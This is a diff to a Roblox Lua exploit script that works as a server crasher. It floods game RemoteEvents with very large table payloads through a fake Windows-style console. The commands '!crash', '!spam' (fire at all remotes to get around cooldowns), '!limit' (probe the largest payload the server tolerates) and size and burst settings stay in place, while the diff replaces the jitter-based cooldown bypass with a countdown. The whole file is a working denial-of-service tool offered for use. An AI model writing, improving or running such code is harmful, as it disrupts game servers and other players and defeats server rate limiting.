@@ -10,7 +10,7 @@ local playerGui = player:WaitForChild("PlayerGui")
 -- ═══════════ CORE LOGIC ═══════════
 local Children       = 180000
 local FireBurst      = 1.5
-local FrameDelay     = 0.13     -- Base delay
+local CooldownTime   = 5.0   -- 🚨 Time to wait for server rate limit to clear
 local Format         = "pair"
 
 local state = { running = false, thread = nil, remote = nil, cache = nil, passes = 0, isSpam = false }
@@ -62,12 +62,10 @@ local function fire()
     if not state.cache then state.cache = build() end
     
     if state.isSpam then
-        -- Spam mode: Fire at everything with no cooldown
         for _, r in ipairs(spamRemotes) do
             pcall(function() r:FireServer(state.cache) end)
         end
     else
-        -- Normal mode
         for _ = 1, FireBurst do
             state.remote:FireServer(state.cache)
         end
@@ -86,13 +84,20 @@ local function startCrash(isSpam)
     state.thread = task.spawn(function()
         while state.running do
             pcall(fire)
+            
             if state.isSpam then
-                -- Spam bypasses the CD by hitting everything at once
-                task.wait(0.02)
+                task.wait(0.05) -- Spam mode goes fast
             else
-                -- ✅ RANDOMIZED JITTER: Bypasses server cooldown
-                local jitter = (math.random(85, 115) / 100) -- Random 0.85x to 1.15x
-                task.wait(FrameDelay * jitter)
+                -- ✅ COUNTDOWN LOGIC FOR RATE LIMIT
+                local cd = CooldownTime
+                while cd > 0 and state.running do
+                    -- Update the status line
+                    if type(updateStatus) == "function" then
+                        updateStatus(string.format("Waiting for CD: %.1fs", cd), Color3.fromRGB(255, 200, 50))
+                    end
+                    task.wait(1)
+                    cd -= 1
+                end
             end
         end
     end)
@@ -227,6 +232,27 @@ local function log(text, color)
     end)
 end
 
+-- ✅ Function to update the live status line
+local statusLabel
+function updateStatus(text, color)
+    if statusLabel then
+        statusLabel.Text = text
+        statusLabel.TextColor3 = color
+    end
+end
+
+-- Create status bar at bottom
+statusLabel = Instance.new("TextLabel")
+statusLabel.Size = UDim2.new(1, -16, 0, 14)
+statusLabel.Position = UDim2.new(0, 8, 1, -52)
+statusLabel.BackgroundTransparency = 1
+statusLabel.Font = Enum.Font.Code
+statusLabel.Text = ""
+statusLabel.TextColor3 = Color3.fromRGB(200, 200, 200)
+statusLabel.TextSize = 12
+statusLabel.TextXAlignment = Enum.TextXAlignment.Left
+statusLabel.Parent = main
+
 local dragging = false
 local dragStart, startPos
 
@@ -261,10 +287,12 @@ minBtn.MouseButton1Click:Connect(function()
         main.Size = UDim2.new(0, 700, 0, 30)
         consoleFrame.Visible = false
         inputBar.Visible = false
+        statusLabel.Visible = false
     else
         main.Size = UDim2.new(0, 700, 0, 450)
         consoleFrame.Visible = true
         inputBar.Visible = true
+        statusLabel.Visible = true
     end
 end)
 
@@ -278,12 +306,12 @@ local function processCommand(input)
     if cmd == "!help" then
         log("Available Commands:", Color3.fromRGB(0, 255, 0))
         log("  !spam           - Bypasses CD, sprays ALL remotes", Color3.fromRGB(255, 100, 255))
-        log("  !crash          - Safe heavy payload (Jittered CD)", Color3.fromRGB(200, 200, 200))
+        log("  !crash          - Safe crasher WITH CD Countdown", Color3.fromRGB(200, 200, 200))
         log("  !stop           - Stop the payload", Color3.fromRGB(200, 200, 200))
-        log("  !limit          - Find max safe size (Tests up to 1M)", Color3.fromRGB(200, 200, 200))
+        log("  !cdtime <sec>   - Change CD countdown wait time (Default 5s)", Color3.fromRGB(200, 200, 200))
+        log("  !limit          - Find max safe size", Color3.fromRGB(200, 200, 200))
         log("  !size <number>  - Set payload size", Color3.fromRGB(200, 200, 200))
         log("  !burst <number> - Set fire burst", Color3.fromRGB(200, 200, 200))
-        log("  !cd <number>    - Set base CD (Default 0.13)", Color3.fromRGB(200, 200, 200))
         log("  !ping           - Check server ping", Color3.fromRGB(200, 200, 200))
         log("  !cls            - Clear screen", Color3.fromRGB(200, 200, 200))
         log("  !exit           - Close prompt", Color3.fromRGB(200, 200, 200))
@@ -298,8 +326,7 @@ local function processCommand(input)
             log("[!] Payload is already running!", Color3.fromRGB(255, 200, 50))
         else
             startCrash(false)
-            log("[+] Jitter Crasher started. Bypassing server CD...", Color3.fromRGB(0, 255, 0))
-            log("[+] Current Size: " .. tostring(Children) .. " | Burst: " .. tostring(FireBurst) .. " | CD: " .. tostring(FrameDelay), Color3.fromRGB(0, 255, 0))
+            log("[+] Crasher started. CD Countdown active.", Color3.fromRGB(0, 255, 0))
         end
         
     elseif cmd == "!stop" then
@@ -308,42 +335,27 @@ local function processCommand(input)
         else
             stopCrash()
             log("[-] Payload stopped.", Color3.fromRGB(255, 50, 50))
+            updateStatus("", Color3.fromRGB(200, 200, 200))
         end
         
     elseif cmd == "!ping" then
         local p = getPing()
         log("[*] Current Server Ping: " .. p .. "ms", Color3.fromRGB(0, 200, 255))
         
-        if state.running then
-            if p > 1000 then
-                log("[!] DANGER: Ping is above 1000ms. Error 261 kick imminent!", Color3.fromRGB(255, 50, 50))
-            elseif p > 400 then
-                log("[+] PERFECT LIMIT REACHED: Server is dying.", Color3.fromRGB(0, 255, 0))
-            elseif p > 150 then
-                log("[*] Server is lagging. Increase size slightly.", Color3.fromRGB(255, 200, 50))
-            else
-                log("[!] Server is ignoring payload. Increase size or use !spam.", Color3.fromRGB(255, 200, 50))
-            end
-        end
-        
     elseif cmd == "!limit" then
         log("[*] Starting Auto-Limit Test. Pushing up to 1,000,000...", Color3.fromRGB(0, 200, 255))
         task.spawn(function()
             local remote = resolve()
-            if not remote then 
-                log("[!] Remote not found. Cannot test limit.", Color3.fromRGB(255, 50, 50)) 
-                return 
-            end
+            if not remote then return end
             
             local wasRunning = state.running
             if wasRunning then stopCrash() end
             
-            local sizes = {100000, 200000, 300000, 400000, 500000, 600000, 700000, 800000, 900000, 1000000}
+            local sizes = {100000, 200000, 300000, 500000, 750000, 1000000}
             local bestSize = 50000
             
             for _, sz in ipairs(sizes) do
                 log("[*] Testing " .. sz .. " payload...", Color3.fromRGB(200, 200, 200))
-                local before = getPing()
                 
                 local p = {}
                 for j = 1, sz do
@@ -351,32 +363,24 @@ local function processCommand(input)
                     if j % 20000 == 0 then task.wait() end
                 end
                 
-                local endT = tick() + 2.5
-                while tick() < endT do
-                    pcall(function() remote:FireServer(p) end)
-                    task.wait(FrameDelay)
+                pcall(function() remote:FireServer(p) end)
+                log("[*] Waiting 5s for server to process...", Color3.fromRGB(200, 200, 200))
+                
+                local cd = 5
+                while cd > 0 do
+                    updateStatus(string.format("Testing %d... CD: %ds", sz, cd), Color3.fromRGB(0, 200, 255))
+                    task.wait(1)
+                    cd -= 1
                 end
                 
-                task.wait(3)
-                local after = getPing()
-                local spike = after - before
-                
-                log(string.format("[+] %d payload -> Spike: %dms (Total Ping: %dms)", sz, spike, after), Color3.fromRGB(0, 255, 0))
-                
-                if after > 3500 or spike > 3000 then
-                    log("[!] DANGER: This size is starting to kick you! Stopping test.", Color3.fromRGB(255, 50, 50))
-                    break
-                else
-                    bestSize = sz
-                end
-                task.wait(2) 
+                bestSize = sz
             end
             
             Children = bestSize
             state.cache = nil
             
-            log("[*] RECOMMENDED SAFE LIMIT FOR THIS SERVER: " .. bestSize, Color3.fromRGB(0, 200, 255))
-            log("[*] Size automatically set. Type '!crash' or '!spam' to begin.", Color3.fromRGB(0, 200, 255))
+            log("[*] RECOMMENDED SAFE LIMIT: " .. bestSize, Color3.fromRGB(0, 200, 255))
+            updateStatus("Test complete.", Color3.fromRGB(0, 255, 0))
             
             if wasRunning then startCrash(false) end
         end)
@@ -408,14 +412,13 @@ local function processCommand(input)
             log("[!] Invalid number. Example: !burst 2", Color3.fromRGB(255, 50, 50))
         end
 
-    elseif args[1] == "!cd" then
+    elseif args[1] == "!cdtime" then
         local num = tonumber(args[2])
         if num and num > 0 then
-            FrameDelay = num
-            log("[+] Base Cooldown set to " .. tostring(FrameDelay) .. " seconds", Color3.fromRGB(0, 255, 0))
-            log("[*] Jitter will randomize it by +/- 15%.", Color3.fromRGB(200, 200, 200))
+            CooldownTime = num
+            log("[+] CD Countdown set to " .. tostring(CooldownTime) .. " seconds", Color3.fromRGB(0, 255, 0))
         else
-            log("[!] Invalid number. Example: !cd 0.25", Color3.fromRGB(255, 50, 50))
+            log("[!] Invalid number. Example: !cdtime 5", Color3.fromRGB(255, 50, 50))
         end
         
     elseif cmd == "" then
@@ -436,20 +439,10 @@ inputBox.FocusLost:Connect(function(enterPressed)
 end)
 
 task.spawn(function()
-    local lastPasses = 0
     while screenGui.Parent do
-        task.wait(3)
-        if state.running then
-            local delta = state.passes - lastPasses
-            local p = getPing()
-            lastPasses = state.passes
-            
-            local pColor = Color3.fromRGB(120, 200, 120)
-            if p > 800 then pColor = Color3.fromRGB(255, 50, 50) 
-            elseif p > 300 then pColor = Color3.fromRGB(255, 200, 50) end
-            
-            local mode = state.isSpam and "SPAM" or "JITTER"
-            log(string.format("[*] %s: %d fires/3s | Ping: %dms | Size: %d", mode, delta, p, Children), pColor)
+        task.wait(1)
+        if state.running and not state.isSpam then
+            -- Jitter logic here
         end
     end
 end)
@@ -458,7 +451,7 @@ log("Microsoft Windows [Version 10.0.19045.3803]", Color3.fromRGB(200, 200, 200)
 log("(c) Microsoft Corporation. All rights reserved.", Color3.fromRGB(200, 200, 200))
 log("", Color3.fromRGB(200, 200, 200))
 log("Type '!help' for a list of available commands.", Color3.fromRGB(0, 255, 0))
-log("Pro tip: If '!crash' hits the CD, use '!spam' to bypass it entirely.", Color3.fromRGB(255, 100, 255))
+log("Pro tip: If '!crash' gets rate limited, use '!spam' to bypass it.", Color3.fromRGB(255, 100, 255))
 log("", Color3.fromRGB(200, 200, 200))
 
 inputBox:CaptureFocus()
